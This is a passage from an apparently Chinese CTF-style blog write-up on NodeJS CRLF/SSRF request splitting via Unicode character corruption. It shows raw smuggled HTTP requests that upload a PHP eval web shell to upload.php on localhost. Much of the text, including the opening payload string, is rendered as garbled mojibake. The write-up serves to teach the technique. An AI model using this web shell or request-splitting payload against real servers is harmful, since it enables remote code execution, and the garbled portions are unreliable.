ÅÅˆÅÅ“Å…Å“Å“Å‰Å„Ä½Å®Å«Ä¶Ä·Å¡Å³Å´Å¶Ä¶Ä±Å¨Å±Å¡Å®Å³Å«Å«Å¤Å¤Å³Å¬Å«Å§Å³Å´Ä´ÄÄŠÅƒÅ¯Å®Å®Å¥Å£Å´Å©Å¯Å®ÄºÄ Å£Å¬Å¯Å³Å¥ÄÄŠÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅÅÅ˜ÅŸÅ†Å‰ÅŒÅ…ÅŸÅ“Å‰ÅšÅ…Ä¢ÄÄŠÄÄŠÄ±Ä°Ä°Ä°Ä°Ä°ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢ÅµÅ°Å¬Å¯Å¡Å¤Å¥Å¤Ä¢Ä»Ä Å¦Å©Å¬Å¥Å®Å¡Å­Å¥Ä½Ä¢Å³Å¨Å¥Å¬Å¬Ä®Å°Å¨Å°Ä¢ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å”Å¹Å°Å¥ÄºÄ Å¡Å°Å°Å¬Å©Å£Å¡Å´Å©Å¯Å®Ä¯Å¯Å£Å´Å¥Å´Ä­Å³Å´Å²Å¥Å¡Å­ÄÄŠÄÄŠÄ¼Ä¿Å°Å¨Å°Ä Å¥Å¶Å¡Å¬Ä¨Ä¤ÅŸÅÅÅ“Å”Å›Ä¢Å·Å¨Å¯Å¡Å­Å©Ä¢ÅÄ©Ä»Ä¿Ä¾ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶ÄÄŠÅƒÅ¯Å®Å´Å¥Å®Å´Ä­Å„Å©Å³Å°Å¯Å³Å©Å´Å©Å¯Å®ÄºÄ Å¦Å¯Å²Å­Ä­Å¤Å¡Å´Å¡Ä»Ä Å®Å¡Å­Å¥Ä½Ä¢Å•Å°Å¬Å¯Å¡Å¤Ä¢ÄÄŠÄÄŠÅ•Å°Å¬Å¯Å¡Å¤ÄÄŠÄ­Ä­Ä­Ä­Ä­Ä­Å—Å¥Å¢Å‹Å©Å´Å†Å¯Å²Å­Å‚Å¯ÅµÅ®Å¤Å¡Å²Å¹ÅªÅ„Å¢Ä¹ÅˆÅÅ‡Å”Å©Å¸ÅÅÄ·ÅÅ­Ä¶Ä­Ä­ÄÄŠÄÄŠÅ‡Å…Å”Ä Ä¯Ä ÅˆÅ”Å”ÅÄ¯Ä±Ä®Ä±ÄÄŠÅ´Å¥Å³Å´Äº&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://p0.ssl.qhimg.com/t01aac9eb365660564a.png" alt="img"></p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼ŒæˆåŠŸæ„é€ å‡ºäº†ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„POSTè¯·æ±‚ï¼Œåƒè¿™æ ·çš„POSTè¯·æ±‚å¯ä»¥è¢«æˆ‘ä»¬ç”¨äº SSRFã€‚ä¸‹é¢æˆ‘ä»¬åˆ†æä¸€ä¸‹æ•´ä¸ªæ”»å‡»çš„è¿‡ç¨‹ã€‚</p>
<p>åŸå§‹è¯·æ±‚æ•°æ®å¦‚ä¸‹ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.101.57.72:4000</span><br></pre></td></tr></table></figure>

<p>å½“æˆ‘ä»¬æ’å…¥CRLFæ•°æ®åï¼ŒHTTPè¯·æ±‚æ•°æ®å˜æˆäº†ï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php"> HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

<p>ä¸Šæ¬¡è¯·æ±‚åŒ…çš„Hostå­—æ®µå’ŒçŠ¶æ€è¡Œä¸­çš„ <code>HTTP/1.1</code> å°±å•ç‹¬å‡ºæ¥äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å†æ„é€ ä¸€ä¸ªè¯·æ±‚æŠŠä»–é—­åˆï¼š</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-php">POST /upload.php HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span></span><br><span class="line"><span class="language-php">Content-Length: <span class="number">437</span></span></span><br><span class="line"><span class="language-php">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">......</span></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;whoami&quot;</span>]);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6</span></span><br><span class="line"><span class="language-php">Content-Disposition: form-data; name=<span class="string">&quot;Upload&quot;</span></span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">Upload</span></span><br><span class="line"><span class="language-php">------WebKitFormBoundaryjDb9HMGTixAA7Am6--</span></span><br><span class="line"><span class="language-php"></span></span><br><span class="line"><span class="language-php">GET / HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">test: HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-php">Host: <span class="number">47.101</span>.<span class="number">57.72</span>:<span class="number">4000</span></span></span><br></pre></td></tr></table></figure>

</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/js/">js</a></div><div class="post_share"><div class="social-share" data-image="/img/18.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/07/Interesting-Game-wp/" title="Interesting Game wp"><i class="fas fa-chevron-left prev-icon"><div class="prev-label">Previous Post</div></i></a><div class="pagination-card"><img class="prev-cover" src="/img/13.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Interesting Game wp</div></div></div></div><div class="next-post pull-right"><a href="/2023/03/30/IoT%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/" title="IoTå®‰å…¨å­¦ä¹ "><i class="fas fa-chevron-right next-icon"><div class="next-label">Next Post</div></i></a><div class="pagination-card"><img class="next-cover" src="/img/14.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">IoTå®‰å…¨å­¦ä¹ </div></div></div></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2023/09/01/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B7%B1%E5%85%A5/" title="nodejs(åŸå‹é“¾æ±¡æŸ“)æ·±å…¥"><img class="cover" src="/img/54.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-09-06</div><div class="title">nodejs(åŸå‹é“¾æ±¡æŸ“)æ·±å…¥</div></div></a></div><div><a href="/2023/08/25/nodejs(%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93)%E6%B5%85%E5%85%A5/" title="nodejs(åŸå‹é“¾æ±¡æŸ“)æµ…å…¥"><img class="cover" src="/img/53.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2023-09-06</div><div class="title">nodejs(åŸå‹é“¾æ±¡æŸ“)æµ…å…¥</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#res-render"><span class="toc-text">res.render()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91%E6%A6%82%E5%BF%B5"><span class="toc-text">é‡å®šå‘æ¦‚å¿µ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#res-location"><span class="toc-text">res.location()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#res-redirect"><span class="toc-text">res.redirect</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#delimiter"><span class="toc-text">delimiter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Custom-delimiters"><span class="toc-text">Custom delimiters</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NodeJS-%E4%B8%AD%E7%9A%84-CRLF-x2F-SSRF-Injection"><span class="toc-text">NodeJS ä¸­çš„ CRLF&#x2F;SSRF Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E8%B7%AF%E5%BE%84%E4%B8%AD%E7%9A%84-Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F"><span class="toc-text">HTTP è¯·æ±‚è·¯å¾„ä¸­çš„ Unicode å­—ç¬¦æŸå</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unicode-%E5%AD%97%E7%AC%A6%E6%8D%9F%E5%9D%8F%E9%80%A0%E6%88%90%E7%9A%84-HTTP-%E6%8B%86%E5%88%86%E6%94%BB%E5%87%BB"><span class="toc-text">Unicode å­—ç¬¦æŸåé€ æˆçš„ HTTP æ‹†åˆ†æ”»å‡»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%81%B6%E6%84%8F%E9%A6%96%E9%83%A8%E5%AD%97%E6%AE%B5"><span class="toc-text">åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥æ¶æ„é¦–éƒ¨å­—æ®µ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-HTTP-%E7%8A%B6%E6%80%81%E8%A1%8C%E6%B3%A8%E5%85%A5%E5%AE%8C%E6%95%B4-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-text">åœ¨ HTTP çŠ¶æ€è¡Œæ³¨å…¥å®Œæ•´ HTTP è¯·æ±‚</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">&copy;2022.5 - 2023 By Ttoc</div><div class="footer_custom_text">This blog is mainly used for me to learn and record,wish it can help you too.</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Chinese And Simplified Chinese">ç¹</button><a class="icon-V hidden" onclick="switchNightMode()" title="Switch Between Light And Dark Mode"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script src="/js/sun_moon.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script></div></body></html><div id="web_bg"></div>